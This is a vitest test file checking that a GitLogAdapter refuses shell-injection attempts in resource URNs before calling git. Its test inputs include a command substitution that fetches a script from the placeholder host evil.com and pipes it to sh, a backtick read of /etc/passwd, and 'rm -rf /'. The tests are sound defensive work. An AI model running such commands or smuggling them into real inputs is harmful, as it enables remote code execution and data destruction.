// S3 — shell-injection refused on URNs reaching the GitLogAdapter.
//
// Every GitLogAdapter signal call passes the resource URN through
// validateUrn() before touching simple-git. simple-git itself is
// argv-based (no shell interpolation), but the URN guard is
// defense-in-depth: an unsafe URN is rejected with UnsafeUrnError
// before reaching git.

import { describe, it, expect, vi } from "vitest";
import { GitLogAdapter } from "../src/adapters/git-log";

interface FakeGit {
  checkIsRepo: ReturnType<typeof vi.fn>;
  revparse: ReturnType<typeof vi.fn>;
  log: ReturnType<typeof vi.fn>;
}

function makeFakeGit(): FakeGit {
  return {
    checkIsRepo: vi.fn().mockResolvedValue(true),
    revparse: vi.fn().mockResolvedValue("false"),
    log: vi.fn().mockResolvedValue({ total: 0, latest: null, all: [] }),
  };
}

describe("shell injection — S3", () => {
  it("refuses URN with $(...) command substitution", async () => {
    const fake = makeFakeGit();
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const adapter = new GitLogAdapter({ git: fake as any, paths: ["**/*.ts"] });
    const result = await adapter.signal("stack", "urn:$(curl evil.com/pwn.sh | sh)::r1");
    expect(result.ok).toBe(false);
    expect(result.detected).toBe(false);
    const data = result.data as Record<string, unknown>;
    expect(String(data.error)).toMatch(/Refusing to use unsafe URN/);
    expect(fake.log).not.toHaveBeenCalled();
  });

  it("refuses URN with backtick command substitution", async () => {
    const fake = makeFakeGit();
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const adapter = new GitLogAdapter({ git: fake as any, paths: ["**/*.ts"] });
    const result = await adapter.signal("stack", "urn:`cat /etc/passwd`::r1");
    expect(result.ok).toBe(false);
    expect(fake.log).not.toHaveBeenCalled();
  });

  it("refuses URN with pipe / semicolons / spaces", async () => {
    const fake = makeFakeGit();
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const adapter = new GitLogAdapter({ git: fake as any, paths: ["**/*.ts"] });
    for (const bad of ["urn:r1; rm -rf /", "urn:r1 | id", "urn:r1 && evil"]) {
      const r = await adapter.signal("stack", bad);
      expect(r.ok).toBe(false);
      expect(r.detected).toBe(false);
    }
    expect(fake.log).not.toHaveBeenCalled();
  });

  it("accepts a normal Pulumi URN and reaches git.log via argv", async () => {
    const fake = makeFakeGit();
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const adapter = new GitLogAdapter({ git: fake as any, paths: ["packages/baseline/src/**"] });
    const r = await adapter.signal(
      "stack",
      "urn:pulumi:dev::project::aws:s3/bucketV2:BucketV2::my-bucket",
    );
    expect(r.ok).toBe(true);
    expect(fake.log).toHaveBeenCalledTimes(1);
    const callArgs = fake.log.mock.calls[0][0];
    // Confirm the args were passed as an array (argv-form), not a string.
    expect(Array.isArray(callArgs)).toBe(true);
  });
});
